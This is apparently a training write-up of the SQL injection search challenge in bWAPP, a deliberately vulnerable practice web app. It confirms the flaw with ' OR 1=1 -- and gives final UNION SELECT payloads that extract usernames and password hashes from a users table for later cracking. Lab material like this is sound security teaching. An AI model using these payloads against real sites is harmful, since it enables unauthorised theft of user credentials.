# Introduction
---

The Buggy Web Application (BWAPP) offers a set of challenges based on the ***SQL Injection vulnerability***. (**A03:2021 - Injection**)

***SECURITY LEVELS COVERED***
- Low

# Target
---

![Target](images/SqliGetSearchTarget.png)

# Functionality
---

Passing `test` to determine how the application reacts to entries that don't exist in the database:

![Test](images/SqliGetSearchTest.png)

Passing `Iron Man` to see the application's reaction to an entry that is (likely) in the database:

![Function](images/SqliGetSearchFunction.png)

### Probable SQL query:

```SQL
SELECT * FROM movies WHERE title="$variable"
```

# Exploitation
---

Passing the `' OR 1=1 -- ` query to test for SQL injection:

![Success](images/SqliGetSearchSuccess.png)

The application returns all entries from the database, vulnerability confirmed.

Now passing a `UNION`-based payload to attempt retrieving data from the (likely present) `users` table:

![Search union](images/SqlGetSearchUnion.png)

This proves that the `users` table exists. The statements return a different number of columns.

Passing the `UNION` payload tampered with `NULL` values to retrieve the `users` table entries, incrementing the number of `NULL` values until the query results in success:

![Union pwd](images/SqliGetSearchUnionPwd.png)

Hashed passwords that can later be cracked using tools like `hashcat`.

![Union users](images/SqliGetSearchUnionUsers.png)

### Final payloads

Retrieving hashed password entries:

```SQL
Iron Man' UNION SELECT login, password, NULL, NULL, NULL, NULL, NULL FROM users -- 
```

Retrieving login entries:

```SQL
Iron Man' UNION SELECT password, login, NULL, NULL, NULL, NULL, NULL FROM users -- 
```
